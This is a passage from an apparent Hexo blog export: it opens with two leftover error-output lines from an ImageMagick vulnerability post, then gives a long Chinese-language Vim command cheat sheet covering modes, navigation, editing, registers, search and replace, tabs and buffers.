class="line"><span class="string">php7.0: unable to open image `/tmp/magick-26514R1_vHPpfdb1l'</span>: No such file or directory @ error/blob.c/OpenBlob/2709.</span><br><span class="line">php7.0: unable to open file `/tmp/magick-26514R1_vHPpfdb1l<span class="string">': No such file or directory @ error/constitute.c/ReadImage/540.</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> ImageMagick </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vim</title>
      <link href="/2016/04/10/post/vim/"/>
      <url>/2016/04/10/post/vim/</url>
      <content type="html"><![CDATA[<h2 id="Vim的几种模式"><a href="#Vim的几种模式" class="headerlink" title="Vim的几种模式"></a>Vim的几种模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">正常模式：可以使用快捷键命令，或按:输入命令行。</span><br><span class="line">插入模式：可以输入文本，在正常模式下，按i、a、o等都可以进入插入模式。</span><br><span class="line">可视模式：正常模式下按v可以进入可视模式，</span><br><span class="line">    在可视模式下，移动光标可以选择文本。按V进入可视行模式，</span><br><span class="line">    总是整行整行的选中。ctrl+v进入可视块模式。</span><br><span class="line">替换模式：正常模式下，按R进入。</span><br></pre></td></tr></table></figure><h2 id="启动Vim"><a href="#启动Vim" class="headerlink" title="启动Vim"></a>启动Vim</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim -c cmd file: 在打开文件前，先执行指定的命令；</span><br><span class="line">vim -r file: 恢复上次异常退出的文件；</span><br><span class="line">vim -R file: 以只读的方式打开文件，但可以强制保存；</span><br><span class="line">vim -M file: 以只读的方式打开文件，不可以强制保存；</span><br><span class="line">vim -y num file: 将编辑窗口的大小设为num行；</span><br><span class="line">vim + file: 从文件的末尾开始；</span><br><span class="line">vim +num file: 从第num行开始；</span><br><span class="line">vim +/string file: 打开file，并将光标停留在第一个找到的string上。</span><br><span class="line">vim --remote file: 用已有的vim进程打开指定的文件。</span><br><span class="line">    如果你不想启用多个vim会话，这个很有用。但要注意，</span><br><span class="line">    如果你用vim，会寻找名叫VIM的服务器；如果你已经有一个gvim在运行了，</span><br><span class="line">    你可以用gvim --remote file在已有的gvim中打开文件。</span><br></pre></td></tr></table></figure><h2 id="文档操作"><a href="#文档操作" class="headerlink" title="文档操作"></a>文档操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">:e file --关闭当前编辑的文件，并开启新的文件。 如果对当前文件的修改未保存，vi会警告。</span><br><span class="line">:e! file --放弃对当前文件的修改，编辑新的文件。</span><br><span class="line">:e+file -- 开始新的文件，并从文件尾开始编辑。</span><br><span class="line">:e+n file -- 开始新的文件，并从第n行开始编辑。</span><br><span class="line">:enew --编译一个未命名的新文档。(CTRL-W n)</span><br><span class="line">:e -- 重新加载当前文档。</span><br><span class="line">:e! -- 重新加载当前文档，并丢弃已做的改动。</span><br><span class="line">:e#或ctrl+^ -- 回到刚才编辑的文件，很实用。</span><br><span class="line">:f或ctrl+g -- 显示文档名，是否修改，和光标位置。</span><br><span class="line">:f filename -- 改变编辑的文件名，这时再保存相当于另存为。</span><br><span class="line">gf -- 打开以光标所在字符串为文件名的文件。</span><br><span class="line">:w -- 保存修改。</span><br><span class="line">:n1,n2w filename -- 选择性保存从某n1行到另n2行的内容。</span><br><span class="line">:wq -- 保存并退出。</span><br><span class="line">ZZ -- 保存并退出。</span><br><span class="line">:x -- 保存并退出。</span><br><span class="line">:q[uit] ——退出当前窗口。(CTRL-W q或CTRL-W CTRL-Q)</span><br><span class="line">:saveas newfilename -- 另存为</span><br><span class="line">:browse e -- 会打开一个文件浏览器让你选择要编辑的文件。</span><br><span class="line">    如果是终端中，则会打开netrw的文件浏览窗口；</span><br><span class="line">    如果是gvim，则会打开一个图形界面的浏览窗口。</span><br><span class="line">    实际上:browse后可以跟任何编辑文档的命令，如sp等。</span><br><span class="line">    用browse打开的起始目录可以由browsedir来设置：</span><br><span class="line">    :set browsedir=last -- 用上次访问过的目录（默认）；</span><br><span class="line">    :set browsedir=buffer -- 用当前文件所在目录；</span><br><span class="line">    :set browsedir=current -- 用当前工作目录；</span><br><span class="line">:Sex -- 水平分割一个窗口，浏览文件系统；</span><br><span class="line">:Vex -- 垂直分割一个窗口，浏览文件系统；</span><br></pre></td></tr></table></figure><h2 id="光标的移动"><a href="#光标的移动" class="headerlink" title="光标的移动"></a>光标的移动</h2><h3 id="基本移动"><a href="#基本移动" class="headerlink" title="基本移动"></a>基本移动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">以下移动都是在normal模式下。</span><br><span class="line"></span><br><span class="line">    h或退格: 左移一个字符；</span><br><span class="line">    l或空格: 右移一个字符；</span><br><span class="line">    j: 下移一行；</span><br><span class="line">    k: 上移一行；</span><br><span class="line">    gj: 移动到一段内的下一行；</span><br><span class="line">    gk: 移动到一段内的上一行；</span><br><span class="line">    +或Enter: 把光标移至下一行第一个非空白字符。</span><br><span class="line">    -: 把光标移至上一行第一个非空白字符。</span><br><span class="line">    w: 前移一个单词，光标停在下一个单词开头；</span><br><span class="line">    W: 移动下一个单词开头，但忽略一些标点；</span><br><span class="line">    e: 前移一个单词，光标停在下一个单词末尾；</span><br><span class="line">    E: 移动到下一个单词末尾，如果词尾有标点，则移动到标点；</span><br><span class="line">    b: 后移一个单词，光标停在上一个单词开头；</span><br><span class="line">    B: 移动到上一个单词开头，忽略一些标点；</span><br><span class="line">    ge: 后移一个单词，光标停在上一个单词末尾；</span><br><span class="line">    gE: 同 ge ，不过‘单词’包含单词相邻的标点。</span><br><span class="line">    (: 前移1句。</span><br><span class="line">    ): 后移1句。</span><br><span class="line">    &#123;: 前移1段。</span><br><span class="line">    &#125;: 后移1段。</span><br><span class="line">    fc: 把光标移到同一行的下一个c字符处</span><br><span class="line">    Fc: 把光标移到同一行的上一个c字符处</span><br><span class="line">    tc: 把光标移到同一行的下一个c字符前</span><br><span class="line">    Tc: 把光标移到同一行的上一个c字符后</span><br><span class="line">    ;: 配合f &amp; t使用，重复一次</span><br><span class="line">    ,: 配合f &amp; t使用，反向重复一次</span><br><span class="line"></span><br><span class="line">上面的操作都可以配合n使用，比如在正常模式(下面会讲到)下输入3h， 则光标向左移动3个字符。</span><br><span class="line"></span><br><span class="line">    0: 移动到行首。</span><br><span class="line">    g0: 移到光标所在屏幕行行首。</span><br><span class="line">    ^: 移动到本行第一个非空白字符。</span><br><span class="line">    g^: 同 ^ ，但是移动到当前屏幕行第一个非空字符处。</span><br><span class="line">    $: 移动到行尾。</span><br><span class="line">    g$: 移动光标所在屏幕行行尾。</span><br><span class="line">    n|: 把光标移到递n列上。</span><br><span class="line">    nG: 到文件第n行。</span><br><span class="line">    :n&lt;cr&gt; 移动到第n行。</span><br><span class="line">    :$&lt;cr&gt; 移动到最后一行。</span><br><span class="line">    H: 把光标移到屏幕最顶端一行。</span><br><span class="line">    M: 把光标移到屏幕中间一行。</span><br><span class="line">    L: 把光标移到屏幕最底端一行。</span><br><span class="line">    gg: 到文件头部。</span><br><span class="line">    G: 到文件尾部。</span><br></pre></td></tr></table></figure><h3 id="翻屏"><a href="#翻屏" class="headerlink" title="翻屏"></a>翻屏</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ctrl+f: 下翻一屏。</span><br><span class="line">ctrl+b: 上翻一屏。</span><br><span class="line">ctrl+d: 下翻半屏。</span><br><span class="line">ctrl+u: 上翻半屏。</span><br><span class="line">ctrl+e: 向下滚动一行。</span><br><span class="line">ctrl+y: 向上滚动一行。</span><br><span class="line">n%: 到文件n%的位置。</span><br><span class="line">zz: 将当前行移动到屏幕中央。</span><br><span class="line">zt: 将当前行移动到屏幕顶端。</span><br><span class="line">zb: 将当前行移动到屏幕底端。</span><br></pre></td></tr></table></figure><h3 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">使用标记可以快速移动。到达标记后，可以用Ctrl+o返回原来的位置。 </span><br><span class="line">Ctrl+o和Ctrl+i 很像浏览器上的 后退 和 前进 。</span><br><span class="line"></span><br><span class="line">    m&#123;a-z&#125;: 标记光标所在位置，局部标记，只用于当前文件。</span><br><span class="line">    m&#123;A-Z&#125;: 标记光标所在位置，全局标记。标记之后，退出Vim，</span><br><span class="line">        重新启动，标记仍然有效。</span><br><span class="line">    `&#123;a-z&#125;: 移动到标记位置。</span><br><span class="line">    &apos;&#123;a-z&#125;: 移动到标记行的行首。</span><br><span class="line">    `&#123;0-9&#125;：回到上[2-10]次关闭vim时最后离开的位置。</span><br><span class="line">    ``: 移动到上次编辑的位置。&apos;&apos;也可以，不过``精确到列，而&apos;&apos;精确到行</span><br><span class="line">        。如果想跳转到更老的位置，可以按C-o，跳转到更新的位置用C-i。</span><br><span class="line">    `&quot;: 移动到上次离开的地方。</span><br><span class="line">    `.: 移动到最后改动的地方。</span><br><span class="line">    :marks 显示所有标记。</span><br><span class="line">    :delmarks a b -- 删除标记a和b。</span><br><span class="line">    :delmarks a-c -- 删除标记a、b和c。</span><br><span class="line">    :delmarks a c-f -- 删除标记a、c、d、e、f。</span><br><span class="line">    :delmarks! -- 删除当前缓冲区的所有标记。</span><br><span class="line">    :help mark-motions 查看更多关于mark的知识。</span><br></pre></td></tr></table></figure><h2 id="插入文本"><a href="#插入文本" class="headerlink" title="插入文本"></a>插入文本</h2><h3 id="基本插入"><a href="#基本插入" class="headerlink" title="基本插入"></a>基本插入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">i: 在光标前插入；一个小技巧：按8，再按i，进入插入模式，输入=，</span><br><span class="line">    按esc进入命令模式，就会出现8个=。</span><br><span class="line">    这在插入分割线时非常有用，如30i+&lt;esc&gt;就插入了36个+组成的分割线。</span><br><span class="line">I: 在当前行第一个非空字符前插入；</span><br><span class="line">gI: 在当前行第一列插入；</span><br><span class="line">a: 在光标后插入；</span><br><span class="line">A: 在当前行最后插入；</span><br><span class="line">o: 在下面新建一行插入；</span><br><span class="line">O: 在上面新建一行插入；</span><br><span class="line">:r filename在当前位置插入另一个文件的内容。</span><br><span class="line">:[n]r filename在第n行插入另一个文件的内容。</span><br><span class="line">:r !date 在光标处插入当前日期与时间。同理，:r</span><br><span class="line">    !command可以将其它shell命令的输出插入当前文档。</span><br></pre></td></tr></table></figure><h3 id="改写插入"><a href="#改写插入" class="headerlink" title="改写插入"></a>改写插入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c[n]w: 改写光标后1(n)个词。</span><br><span class="line">c[n]l: 改写光标后n个字母。</span><br><span class="line">c[n]h: 改写光标前n个字母。</span><br><span class="line">[n]cc: 修改当前[n]行。</span><br><span class="line">[n]s: 以输入的文本替代光标之后1(n)个字符，相当于c[n]l。</span><br><span class="line">[n]S: 删除指定数目的行，并以所输入文本代替之。</span><br><span class="line"></span><br><span class="line">注意，类似cnw,dnw,ynw的形式同样可以写为ncw,ndw,nyw。</span><br></pre></td></tr></table></figure><h2 id="剪切复制和寄存器"><a href="#剪切复制和寄存器" class="headerlink" title="剪切复制和寄存器"></a>剪切复制和寄存器</h2><h3 id="剪切和复制、粘贴"><a href="#剪切和复制、粘贴" class="headerlink" title="剪切和复制、粘贴"></a>剪切和复制、粘贴</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[n]x: 剪切光标右边n个字符，相当于d[n]l。</span><br><span class="line">[n]X: 剪切光标左边n个字符，相当于d[n]h。</span><br><span class="line">y: 复制在可视模式下选中的文本。</span><br><span class="line">yy or Y: 复制整行文本。</span><br><span class="line">y[n]w: 复制一(n)个词。</span><br><span class="line">y[n]l: 复制光标右边1(n)个字符。</span><br><span class="line">y[n]h: 复制光标左边1(n)个字符。</span><br><span class="line">y$: 从光标当前位置复制到行尾。</span><br><span class="line">y0: 从光标当前位置复制到行首。</span><br><span class="line">:m,ny&lt;cr&gt; 复制m行到n行的内容。</span><br><span class="line">y1G或ygg: 复制光标以上的所有行。</span><br><span class="line">yG: 复制光标以下的所有行。</span><br><span class="line">yaw和yas：复制一个词和复制一个句子，即使光标不在词首和句首也没关系。</span><br><span class="line">d: 删除（剪切）在可视模式下选中的文本。</span><br><span class="line">d$ or D: 删除（剪切）当前位置到行尾的内容。</span><br><span class="line">d[n]w: 删除（剪切）1(n)个单词</span><br><span class="line">d[n]l: 删除（剪切）光标右边1(n)个字符。</span><br><span class="line">d[n]h: 删除（剪切）光标左边1(n)个字符。</span><br><span class="line">d0: 删除（剪切）当前位置到行首的内容</span><br><span class="line">[n] dd: 删除（剪切）1(n)行。</span><br><span class="line">:m,nd&lt;cr&gt; 剪切m行到n行的内容。</span><br><span class="line">d1G或dgg: 剪切光标以上的所有行。</span><br><span class="line">dG: 剪切光标以下的所有行。</span><br><span class="line">daw和das：剪切一个词和剪切一个句子，即使光标不在词首和句首也没关系。</span><br><span class="line">d/f&lt;cr&gt;：这是一个比较高级的组合命令，它将删除当前位置 到下一个f之间的内容。</span><br><span class="line">p: 在光标之后粘贴。</span><br><span class="line">P: 在光标之前粘贴。</span><br></pre></td></tr></table></figure><h3 id="文本对象"><a href="#文本对象" class="headerlink" title="文本对象"></a>文本对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aw：一个词</span><br><span class="line">as：一句。</span><br><span class="line">ap：一段。</span><br><span class="line">ab：一块（包含在圆括号中的）。</span><br><span class="line"></span><br><span class="line">y, d, c, v都可以跟文本对象。</span><br></pre></td></tr></table></figure><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a-z：都可以用作寄存器名。&quot;ayy把当前行的内容放入a寄存器。</span><br><span class="line">A-Z：用大写字母索引寄存器，可以在寄存器中追加内容。 如&quot;Ayy把当前行的内容追加到a寄存器中。</span><br><span class="line">:reg 显示所有寄存器的内容。</span><br><span class="line">&quot;&quot;：不加寄存器索引时，默认使用的寄存器。</span><br><span class="line">&quot;*：当前选择缓冲区，&quot;*yy把当前行的内容放入当前选择缓冲区。</span><br><span class="line">&quot;+：系统剪贴板。&quot;+yy把当前行的内容放入系统剪贴板。</span><br></pre></td></tr></table></figure><h2 id="查找与替换"><a href="#查找与替换" class="headerlink" title="查找与替换"></a>查找与替换</h2><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/something: 在后面的文本中查找something。</span><br><span class="line">?something: 在前面的文本中查找something。</span><br><span class="line">/pattern/+number: 将光标停在包含pattern的行后面第number行上。</span><br><span class="line">/pattern/-number: 将光标停在包含pattern的行前面第number行上。</span><br><span class="line">n: 向后查找下一个。</span><br><span class="line">N: 向前查找下一个。</span><br><span class="line"></span><br><span class="line">可以用grep或vimgrep查找一个模式都在哪些地方出现过，</span><br><span class="line">其中:grep是调用外部的grep程序，而:vimgrep是vim自己的查找算法。</span><br><span class="line">用法为： :vim[grep]/pattern/[g] [j] files</span><br><span class="line">g的含义是如果一个模式在一行中多次出现，则这一行也在结果中多次出现。</span><br><span class="line">j的含义是grep结束后，结果停在第j项，默认是停在第一项。</span><br><span class="line">vimgrep前面可以加数字限定搜索结果的上限，如</span><br><span class="line">:1vim/pattern/ % 只查找那个模式在本文件中的第一个出现。</span><br><span class="line"> </span><br><span class="line">其实vimgrep在读纯文本电子书时特别有用，可以生成导航的目录。</span><br><span class="line">比如电子书中每一节的标题形式为：n. xxxx。你就可以这样：</span><br><span class="line">:vim/^d&#123;1,&#125;./ %</span><br><span class="line">然后用:cw或:copen查看结果，可以用C-w H把quickfix窗口移到左侧，</span><br><span class="line">就更像个目录了。</span><br></pre></td></tr></table></figure><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">:s/old/new - 用new替换当前行第一个old。</span><br><span class="line">:s/old/new/g - 用new替换当前行所有的old。</span><br><span class="line">:n1,n2s/old/new/g - 用new替换文件n1行到n2行所有的old。</span><br><span class="line">:%s/old/new/g - 用new替换文件中所有的old。</span><br><span class="line">:%s/^/xxx/g - 在每一行的行首插入xxx，^表示行首。</span><br><span class="line">:%s/$/xxx/g - 在每一行的行尾插入xxx，$表示行尾。</span><br><span class="line">所有替换命令末尾加上c，每个替换都将需要用户确认。</span><br><span class="line">    如：%s/old/new/gc，加上i则忽略大小写(ignore)。</span><br><span class="line"></span><br><span class="line">还有一种比替换更灵活的方式，它是匹配到某个模式后执行某种命令，</span><br><span class="line">语法为 :[range]g/pattern/command</span><br><span class="line">例如 :%g/^ xyz/normal dd。</span><br><span class="line">表示对于以一个空格和xyz开头的行执行normal模式下的dd命令。</span><br><span class="line"></span><br><span class="line">关于range的规定为：</span><br><span class="line"></span><br><span class="line">如果不指定range，则表示当前行。</span><br><span class="line">m,n: 从m行到n行。</span><br><span class="line">0: 最开始一行（可能是这样）。</span><br><span class="line">$: 最后一行</span><br><span class="line">.: 当前行</span><br><span class="line">%: 所有行</span><br></pre></td></tr></table></figure><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">高级的查找替换就要用到正则表达式。</span><br><span class="line"></span><br><span class="line">\d: 表示十进制数（我猜的）</span><br><span class="line">\s: 表示空格</span><br><span class="line">\S: 非空字符</span><br><span class="line">\a: 英文字母</span><br><span class="line">\|: 表示 或</span><br><span class="line">\.: 表示.</span><br><span class="line">&#123;m,n&#125;: 表示m到n个字符。这要和 \s与\a等连用，如 \a\&#123;m,n&#125; 表示m 到n个英文字母。</span><br><span class="line">&#123;m,&#125;: 表示m到无限多个字符。</span><br><span class="line">**: 当前目录下的所有子目录。</span><br><span class="line"></span><br><span class="line">:help pattern得到更多帮助。</span><br></pre></td></tr></table></figure><h2 id="排版"><a href="#排版" class="headerlink" title="排版"></a>排版</h2><h3 id="基本排版"><a href="#基本排版" class="headerlink" title="基本排版"></a>基本排版</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt; 向左缩进一个shiftwidth</span><br><span class="line">&gt;&gt; 向右缩进一个shiftwidth</span><br><span class="line">:ce(nter) 本行文字居中</span><br><span class="line">:le(ft) 本行文字靠左</span><br><span class="line">:ri(ght) 本行文字靠右</span><br><span class="line">gq 对选中的文字重排，即对过长的文字进行断行</span><br><span class="line">gqq 重排当前行</span><br><span class="line">gqnq 重排n行</span><br><span class="line">gqap 重排当前段</span><br><span class="line">gqnap 重排n段</span><br><span class="line">gqnj 重排当前行和下面n行</span><br><span class="line">gqQ 重排当前段对文章末尾</span><br><span class="line">J 拼接当前行和下一行</span><br><span class="line">gJ 同 J ，不过合并后不留空格。</span><br></pre></td></tr></table></figure><h3 id="拼写检查"><a href="#拼写检查" class="headerlink" title="拼写检查"></a>拼写检查</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:set spell－开启拼写检查功能</span><br><span class="line">:set nospell－关闭拼写检查功能</span><br><span class="line">]s－移到下一个拼写错误的单词</span><br><span class="line">[s－作用与上一命令类似，但它是从相反方向进行搜索</span><br><span class="line">z=－显示一个有关拼写错误单词的列表，可从中选择</span><br><span class="line">zg－告诉拼写检查器该单词是拼写正确的</span><br><span class="line">zw－与上一命令相反，告诉拼写检查器该单词是拼写错误的</span><br></pre></td></tr></table></figure><h3 id="统计字数"><a href="#统计字数" class="headerlink" title="统计字数"></a>统计字数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g ^g可以统计文档字符数，行数。 将光标放在最后一个字符上，用字符数减去行数可以粗略统计中文文档的字数。 以上对 Mac 或 Unix 的文件格式适用。 如果是 Windows 文件格式（即换行符有两个字节），字数的统计方法为： 字符数 - 行数 * 2。</span><br></pre></td></tr></table></figure><h2 id="编辑多个文件"><a href="#编辑多个文件" class="headerlink" title="编辑多个文件"></a>编辑多个文件</h2><h3 id="一次编辑多个文件"><a href="#一次编辑多个文件" class="headerlink" title="一次编辑多个文件"></a>一次编辑多个文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">我们可以一次打开多个文件，如</span><br><span class="line"></span><br><span class="line">vi a.txt b.txt c.txt</span><br><span class="line"></span><br><span class="line">使用:next(:n)编辑下一个文件。</span><br><span class="line">:2n 编辑下2个文件。</span><br><span class="line">使用:previous或:N编辑上一个文件。</span><br><span class="line">使用:wnext，保存当前文件，并编辑下一个文件。</span><br><span class="line">使用:wprevious，保存当前文件，并编辑上一个文件。</span><br><span class="line">使用:args 显示文件列表。</span><br><span class="line">:n filenames或:args filenames 指定新的文件列表。</span><br><span class="line">vi -o filenames 在水平分割的多个窗口中编辑多个文件。</span><br><span class="line">vi -O filenames 在垂直分割的多个窗口中编辑多个文件。</span><br></pre></td></tr></table></figure><h3 id="多标签编辑"><a href="#多标签编辑" class="headerlink" title="多标签编辑"></a>多标签编辑</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim -p files: 打开多个文件，每个文件占用一个标签页。</span><br><span class="line">:tabe, tabnew -- 如果加文件名，就在新的标签中打开这个文件， 否则打开一个空缓冲区。</span><br><span class="line">^w gf -- 在新的标签页里打开光标下路径指定的文件。</span><br><span class="line">:tabn -- 切换到下一个标签。Control + PageDown，也可以。</span><br><span class="line">:tabp -- 切换到上一个标签。Control + PageUp，也可以。</span><br><span class="line">[n] gt -- 切换到下一个标签。如果前面加了 n ， 就切换到第n个标签。第一个标签的序号就是1。</span><br><span class="line">:tab split -- 将当前缓冲区的内容在新页签中打开。</span><br><span class="line">:tabc[lose] -- 关闭当前的标签页。</span><br><span class="line">:tabo[nly] -- 关闭其它的标签页。</span><br><span class="line">:tabs -- 列出所有的标签页和它们包含的窗口。</span><br><span class="line">:tabm[ove] [N] -- 移动标签页，移动到第N个标签页之后。 如 tabm 0</span><br><span class="line">    当前标签页，就会变成第一个标签页。</span><br></pre></td></tr></table></figure><h3 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:buffers或:ls或:files 显示缓冲区列表。</span><br><span class="line">ctrl+^：在最近两个缓冲区间切换。</span><br><span class="line">:bn -- 下一个缓冲区。</span><br><span class="line">:bp -- 上一个缓冲区。</span><br><span class="line">:bl -- 最后一个缓冲区。</span><br><span class="line">:b[n]或:[n]b -- 切换到第n个缓冲区。</span><br><span class="line">:nbw(ipeout) -- 彻底删除第n个缓冲区。</span><br><span class="line">:nbd(elete) -- 删除第n个缓冲区，并未真正删除，还在unlisted列表中。</span><br><span class="line">:ba[ll] -- 